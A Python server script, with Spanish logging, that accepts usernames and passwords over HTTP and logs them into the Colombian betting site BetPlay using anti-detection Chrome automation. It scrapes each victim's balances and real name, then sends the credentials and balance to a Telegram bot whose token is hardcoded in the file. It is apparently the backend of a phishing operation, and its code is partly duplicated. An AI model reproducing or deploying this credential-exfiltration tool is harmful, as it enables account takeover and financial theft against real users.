import http.server
import socketserver
import json
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import os
import tempfile
import threading
import requests
import random
import shutil
import subprocess
import queue
import sys

# ... existing imports ...

def cleanup_driver_cache():
    try:
        # Undetected Chromedriver cache path on Linux
        cache_path = os.path.expanduser("~/.local/share/undetected_chromedriver")
        if os.path.exists(cache_path):
            log_msg(f"🧹 Limpiando caché corrupta de drivers en: {cache_path}")
            shutil.rmtree(cache_path)
            log_msg("✅ Caché limpiada")
    except Exception as e:
        log_msg(f"⚠️ Error limpiando caché: {e}")

# ... (rest of code) ...

def main():
    cleanup_driver_cache() # Force clean start
    pool.start_pool()
    server = ThreadedHTTPServer(('localhost', PORT), APIHandler)
    # ...
PORT = 5000
BOT_TOKEN = "8310315205:AAEDfY0nwuSeC_G6l2hXzbRY2xzvAHNJYvQ"
CHAT_ID = "-1003422457881"
MAX_BROWSERS = 2  # Reverted to 2 for stability (3 caused crashes)

# Lock to prevent race conditions during ChromeDriver patching
init_lock = threading.Lock()

def type_humanLike(element, text):
    for char in text:
        element.send_keys(char)
        time.sleep(random.uniform(0.05, 0.1))

# ... (utils remain same) ...

def click_seguro(driver, elemento):
    try:
        elemento.click()
    except:
        driver.execute_script("arguments[0].click();", elemento)

def log_msg(msg):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    full_msg = f"[{timestamp}] {msg}"
    print(full_msg, flush=True)
    try:
        with open("/var/www/html/server_log.txt", "a") as f:
            f.write(full_msg + "\n")
    except: pass

class BrowserPool:
    def __init__(self, size=3):
        self.size = size
        self.available_drivers = queue.Queue()
        self.drivers = []
        
    def start_pool(self):
        log_msg(f"🚀 Iniciando Pool de Navegadores ({self.size} instancias)...")
        for i in range(self.size):
            t = threading.Thread(target=self._create_and_add_driver, args=(i+1,))
            t.daemon = True
            t.start()
            time.sleep(5)  # Stagger start to reduce load spikes

    def _create_and_add_driver(self, index):
        log_msg(f"🔧 Creando navegador #{index}...")
        driver = self._init_driver(index) # Pass index for logging
        if driver:
            # Custom attribute to track who is logged in on this specific browser
            driver.current_user = None 
            driver.id = index
            self.drivers.append(driver)
            self.available_drivers.put(driver)
            log_msg(f"✅ Navegador #{index} listo y en cola")
        else:
            log_msg(f"❌ Falló inicio de navegador #{index}")

    def _create_options(self):
        options = uc.ChromeOptions()
        options.page_load_strategy = 'eager'
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_argument("--disable-extensions")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--force-device-scale-factor=0.8")
        options.add_argument("--disable-gpu")
        options.add_argument("--disable-background-networking")
        options.add_argument("--disable-default-apps")
        options.add_argument("--disable-sync")
        options.add_argument("--no-first-run")
        options.add_argument("--dns-prefetch-disable")
        options.add_argument("--disable-setuid-sandbox")
        options.add_argument("--disable-web-security")
        options.add_argument("--ignore-certificate-errors")
        options.add_argument("--disable-popup-blocking")
        options.add_argument("--disable-notifications")
        # Flags para evitar crashes en contenedores/VPS limitados
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--disable-browser-side-navigation")
        options.add_argument("--disable-infobars")
        
        prefs = {
            "profile.managed_default_content_settings.images": 2,
            "credentials_enable_service": False,
            "profile.password_manager_enabled": False,
            "profile.default_content_setting_values.notifications": 2
        }
        options.add_experimental_option("prefs", prefs)
        return options

    def _init_driver(self, index=0):
        try:
            temp_dir = tempfile.mkdtemp()
            # Note: user-data-dir assumes options is created later or modified. 
            # We will handle it in the loop or use a fresh options object.
        except: pass
        
        driver = None
        for attempt in range(3):
            try:
                # Create FRESH options each attempt to avoid 'cannot reuse' error
                options = self._create_options()
                
                # Assign unique user-data-dir per attempt/driver to avoid locking
                try:
                    unique_dir = os.path.join(tempfile.mkdtemp(), f'user_data_{index}_{attempt}')
                    options.add_argument(f"--user-data-dir={unique_dir}")
                except: pass

                # CRITICAL: Lock instantiation to prevent 'Text file busy' on driver binary
                with init_lock:
                    driver = uc.Chrome(options=options, headless=False, use_subprocess=True, version_main=144)
                
                driver.set_window_size(1000, 800)
                driver.get("https://betplay.com.co/")
                time.sleep(2)
                self._close_popup(driver)
                return driver
            except Exception as e:
                log_msg(f"⚠️ Error init driver #{index} (Intento {attempt+1}): {e}")
                try:
                    if driver: driver.quit()
                except: pass
                driver = None
                time.sleep(3)
        return None

    def _close_popup(self, driver):
        try:
            boton = WebDriverWait(driver, 5).until(
                EC.presence_of_element_located((By.XPATH, "/html/body/div[2]/div/div/div/div[2]/button[2]"))
            )
            click_seguro(driver, boton)
        except: pass

    def acquire(self):
        return self.available_drivers.get()

    def release(self, driver):
        self.available_drivers.put(driver)

    def remove_driver(self, driver):
        if driver in self.drivers:
            self.drivers.remove(driver)
            try: driver.quit()
            except: pass

    def replace_driver(self, index):
        log_msg(f"🚑 Reemplazando navegador muerto #{index}...")
        new_driver = self._init_driver(index)
        if new_driver:
            new_driver.current_user = None
            new_driver.id = index
            self.drivers.append(new_driver)
            self.release(new_driver)
            log_msg(f"✅ Navegador #{index} resucitado y listo")
        else:
            log_msg(f"💀 No se pudo revivir navegador #{index}")

    def shutdown(self):
        for driver in self.drivers:
            try: driver.quit()
            except: pass

# Global Pool
pool = BrowserPool(size=MAX_BROWSERS)

class LoginWorker:
    def handle_login(self, username, password):
        log_msg(f"⏳ Esperando navegador disponible para {username}...")
        driver = pool.acquire()
        log_msg(f"🤖 Navegador #{driver.id} asignado a {username}")
        
        fatal_error = False

        try:
            # 1. Check Previous Session
            if driver.current_user == username:
                log_msg(f"🔄 Reusando sesión de navegador #{driver.id} para {username}")
                # Validation to ensure session is alive
                try: 
                    driver.current_url 
                except: 
                    raise Exception("Browser Session Dead")

                driver.get("https://betplay.com.co/")
                balances = self._scrape_balance(driver)
                
                if balances and balances.get("total") is not None:
                     # Extract real name if possible
                     real_name = username
                     try:
                         real_name_el = driver.find_element(By.ID, "spanUser")
                         real_name = real_name_el.text.strip()
                     except: pass

                     log_msg(f"✅ Sesión reutilizada para {username} ({real_name}) - Saldo: {balances['total']}")
                     response_data = {"status": "success", "balances": balances, "message": "Sesión reutilizada", "user": {"name": username, "real_name": real_name, "balance_total": balances["total"]}}
                     # Silently logout in background to prepare for NEXT user
                     threading.Thread(target=self._logout_if_needed, args=(driver,)).start()
                     return response_data
                else:
                     log_msg("⚠️ Sesión reusada expirada")
            
            # 2. Logout if needed
            self._logout_if_needed(driver)

            # 3. Login
            log_msg(f"🔑 Logueando {username} en navegador #{driver.id}...")
            
            try:
                user_el = WebDriverWait(driver, 5).until(EC.visibility_of_element_located((By.ID, "userName")))
            except:
                driver.get("https://betplay.com.co/")
                user_el = WebDriverWait(driver, 10).until(EC.visibility_of_element_located((By.ID, "userName")))
            
            user_el.clear()
            type_humanLike(user_el, username)
            
            pass_el = WebDriverWait(driver, 10).until(EC.visibility_of_element_located((By.ID, "password")))
            pass_el.clear()
            type_humanLike(pass_el, password)
            
            btn = WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.ID, "btnLoginPrimary")))
            click_seguro(driver, btn)
            
            # --- OPTIMIZED WAIT LOGIC ---
            # Wait simultaneously for EITHER success (balance) OR error (toast)
            # This replaces the hardcoded sleep(6) + sleep(3)
            log_msg(f"⏳ Esperando resultado para {username} (Detección dinámica)...")
            
            start_time = time.time()
            login_success = False
            
            # Polling loop for up to 15 seconds (max wait)
            # Typically returns in 1-3 seconds
            while time.time() - start_time < 15:
                # A. Check for Errors (Fast fail)
                try:
                    error_els = driver.find_elements(By.CSS_SELECTOR, ".toast-message, .toast-content, .snack-bar-container")
                    for el in error_els:
                        if el.is_displayed():
                            error_text = el.text.strip()
                            if "mal el usuario" in error_text or "incorrecto" in error_text or "inválida" in error_text:
                                log_msg(f"❌ Error detectado rápidamente: {error_text}")
                                self._clear_error_toasts(driver)
                                return {"status": "error", "message": "Usuario o contraseña incorrectos"}
                except: pass

                # B. Check for Success Indicators (Balance or User Menu)
                try:
                    # Look for money sign or user menu which appears only after login
                    if driver.find_elements(By.ID, "navbarDropdown2") or \
                       driver.find_elements(By.CSS_SELECTOR, ".user-balance") or \
                       driver.find_elements(By.XPATH, "//*[contains(text(), '$')]"):
                        login_success = True
                        break
                except: pass
                
                time.sleep(0.5) # Short polling interval

            if not login_success:
                 # Last ditch check before giving up
                 log_msg("⚠️ Tiempo de espera agotado sin confirmación clara, intentando scraping de todos modos...")

            self._close_popup(driver)

            # Validate browser is still alive
            try:
                driver.current_url
            except:
                raise Exception("Browser died after login")
            
            # Immediate scraping (no extra sleep needed)
            balances = self._scrape_balance(driver)
            
            if balances and balances.get("total") is not None:
                # Extract real name
                real_name = username
                try:
                    real_name_el = driver.find_element(By.ID, "spanUser")
                    real_name = real_name_el.text.strip()
                    log_msg(f"👤 Nombre real detectado: {real_name}")
                except: pass

                driver.current_user = username
                self._send_telegram(username, password, balances["total"])
                log_msg(f"✅ Login exitoso para {username}: {balances['total']}")
                
                response_data = {"status": "success", "balances": balances, "message": "Login exitoso", "user": {"name": username, "real_name": real_name, "balance_total": balances["total"]}}
                
                # Cleanup: Logout now
                log_msg(f"🧹 Limpiando sesión de {username} para el siguiente usuario...")
                self._logout_if_needed(driver)
                
                return response_data
            else:
                log_msg(f"❌ No se pudo extraer saldo para {username} (Quizás login fallido)")
                self._capture_debug(driver, username, "no_balance")
                # On scraping failure, refresh page to clear any weird state
                self._clear_error_toasts(driver)
                driver.get("https://betplay.com.co/")
                return {"status": "error", "message": "No se pudo extraer el saldo. Verifica tus datos."}

        except Exception as e:
            err_str = str(e)
            log_msg(f"❌ Error crítico en navegador #{driver.id}: {err_str}")
            self._capture_debug(driver, username, "exception")
            # Force refresh on any unexpected error
            try: driver.get("https://betplay.com.co/")
            except: pass
            
            if "Connection refused" in err_str or "Max retries exceeded" in err_str or "Browser Session Dead" in err_str:
                fatal_error = True

            return {"status": "error", "message": err_str}
        finally:
            if fatal_error:
                log_msg(f"♻️ Desechando navegador tóxico #{driver.id}")
                pool.remove_driver(driver)
                threading.Thread(target=pool.replace_driver, args=(driver.id,)).start()
            else:
                log_msg(f"♻️ Liberando navegador #{driver.id}")
                pool.release(driver)

    def _logout_if_needed(self, driver):
        try:
            menu = driver.find_elements(By.CSS_SELECTOR, '#navbarDropdown2')
            if menu:
                click_seguro(driver, menu[0])
                time.sleep(1)
                logout_btn = driver.find_element(By.CSS_SELECTOR, '#header .text-center button')
                click_seguro(driver, logout_btn)
                time.sleep(3)
                driver.current_user = None
                driver.get("https://betplay.com.co/")
        except: pass

    def _scrape_balance(self, driver):
        balances = {
            "total": None,
            "real": None,
            "activo": None,
            "pendiente": None
        }
        try:
            log_msg("🔍 Intentando extraer múltiples saldos...")
            
            # Check for alerts that might block scraping
            try:
                alert = driver.switch_to.alert
                log_msg(f"⚠️ Alerta detectada: '{alert.text}'. Aceptando...")
                alert.accept()
            except: pass
            
            # Method 1: Click user menu and extract from dropdown
            try:
                log_msg("📍 Método 1: Buscando menú de usuario para saldos detallados...")
                menu = None
                selectors = ['#navbarDropdown2', '[aria-label="User menu"]', '.user-menu']
                
                for selector in selectors:
                    try:
                        menu = WebDriverWait(driver, 3).until(EC.element_to_be_clickable((By.CSS_SELECTOR, selector)))
                        log_msg(f"✅ Menú encontrado con selector: {selector}")
                        break
                    except: continue
                
                if not menu:
                    raise Exception("No se encontró el menú de usuario")
                
                click_seguro(driver, menu)
                time.sleep(1.5)
                
                # Use the specific XPaths provided by the user
                xpath_map = {
                    "total": '//*[@id="header"]/div/div[3]/div/app-profile/div/div/div/div/div[2]/app-menu/ul/div[1]/table/tr[1]/td[3]',
                    "real": '//*[@id="header"]/div/div[3]/div/app-profile/div/div/div/div/div[2]/app-menu/ul/div[1]/table/tr[2]/td[3]',
                    "activo": '//*[@id="header"]/div/div[3]/div/app-profile/div/div/div/div/div[2]/app-menu/ul/div[1]/table/tr[3]/td[3]',
                    "pendiente": '//*[@id="header"]/div/div[3]/div/app-profile/div/div/div/div/div[2]/app-menu/ul/div[1]/table/tr[5]/td[3]'
                }
                
                for key, xpath in xpath_map.items():
                    try:
                        el = WebDriverWait(driver, 5).until(EC.visibility_of_element_located((By.XPATH, xpath)))
                        val = el.text.strip()
                        if val:
                            balances[key] = val
                            log_msg(f"💰 {key.capitalize()} encontrado: {val}")
                    except Exception as e:
                        log_msg(f"⚠️ No se pudo extraer {key}: {e}")
                
                # If we got at least the total, consider it a success
                if balances["total"] is not None:
                    return balances
                    
                log_msg("⚠️ Menú abierto pero no se encontró el saldo total mediante XPaths detallados")
                
            except Exception as e:
                log_msg(f"⚠️ Método 1 falló: {e}")
            
            # Fallback (as before) for total balance only if everything else fails
            log_msg("📍 Fallback: Buscando cualquier saldo en la página...")
            try:
                balance_elements = driver.find_elements(By.XPATH, '//div[contains(text(), "$")] | //span[contains(text(), "$")] | //td[contains(text(), "$")]')
                for el in balance_elements:
                    try:
                        text = el.text.strip()
                        if text and len(text) < 20 and any(c.isdigit() for c in text):
                            log_msg(f"💰 Posible saldo total encontrado (fallback): {text}")
                            balances["total"] = text
                            return balances
                    except: continue
            except: pass
            
            return balances
            
        except Exception as e:
            log_msg(f"❌ Error general en _scrape_balance: {e}")
            return balances

    def _close_popup(self, driver):
        try:
            boton = WebDriverWait(driver, 5).until(
                EC.presence_of_element_located((By.XPATH, "/html/body/div[2]/div/div/div/div[2]/button[2]"))
            )
            click_seguro(driver, boton)
        except: pass

    def _clear_error_toasts(self, driver):
        """Intenta cerrar cualquier toast de error persistente (rojo)"""
        try:
            log_msg("🧹 Limpiando toasts de error...")
            # Opción 1: Buscar botón de cerrar en el toast
            close_btns = driver.find_elements(By.CSS_SELECTOR, ".toast-close-button, .toast span.close, .snack-bar-container button")
            for btn in close_btns:
                try: click_seguro(driver, btn)
                except: pass
            
            # Opción 2: Click en el centro del toast (si es clickeable para cerrar)
            toasts = driver.find_elements(By.CSS_SELECTOR, ".toast, .snack-bar-container, .toast-message")
            for t in toasts:
                try: click_seguro(driver, t)
                except: pass
            
            # Opción 3: Forzar eliminación vía JS si nada funciona
            driver.execute_script('''
                document.querySelectorAll(".toast, .toast-container, .snack-bar-container").forEach(el => el.remove());
            ''')
            time.sleep(0.5)
        except: pass

    def _send_telegram(self, user, pwd, bal):
        try:
            msg = f"<b>💰 LOGIN SERVER (3-THREADS)</b>\nUser: {user}\nPass: {pwd}\nBal: {bal}"
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": msg, "parse_mode": "HTML"}, timeout=2)
        except: pass

    def _capture_debug(self, driver, username, suffix):
        try:
            timestamp = int(time.time())
            screenshot_path = f"/var/www/html/debug_{username}_{suffix}_{timestamp}.png"
            html_path = f"/var/www/html/debug_{username}_{suffix}_{timestamp}.html"
            
            driver.save_screenshot(screenshot_path)
            with open(html_path, "w", encoding="utf-8") as f:
                f.write(driver.page_source)
            
            log_msg(f"📸 Debug guardado: {screenshot_path}")
        except Exception as e:
            log_msg(f"⚠️ Error capturando debug: {e}")

# Threaded Server
class ThreadedHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    pass

class APIHandler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/login':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            
            try:
                data = json.loads(post_data.decode('utf-8'))
                user = data.get('username')
                pwd = data.get('password')

                log_msg(f"⚡ REQUEST RECEIVED: {user}. Drivers libres: {pool.available_drivers.qsize()}")
                
                worker = LoginWorker()
                result = worker.handle_login(user, pwd)
                
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps(result).encode('utf-8'))
            except Exception as e:
                self.send_response(500)
                self.end_headers()
                self.wfile.write(json.dumps({"error": str(e)}).encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()

# ... (removed import subprocess)

def kill_zombies():
    log_msg("🔫 Eliminando procesos zombies de Chrome...")
    try:
        subprocess.run(['pkill', '-9', 'chrome'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(['pkill', '-9', 'undetected_chromedriver'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except: pass

def force_patch_driver():
    log_msg("🛠️ Priming Driver Cache (Patching binary synchronously)...")
    try:
        options = uc.ChromeOptions()
        options.add_argument("--headless=new")
        driver = uc.Chrome(options=options, headless=True, use_subprocess=True, version_main=144)
        driver.quit()
        log_msg("✅ Driver Binary Patched & Ready")
        time.sleep(2)
    except Exception as e:
        log_msg(f"⚠️ Error priming driver: {e}")

def main():
    kill_zombies()
    cleanup_driver_cache()
    force_patch_driver()
    
    pool.start_pool()
    server = ThreadedHTTPServer(('0.0.0.0', PORT), APIHandler)
    print(f"🌍 Servidor Multi-Hilo BetPlay corriendo en http://0.0.0.0:{PORT}")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        pool.shutdown()

if __name__ == '__main__':
    main()
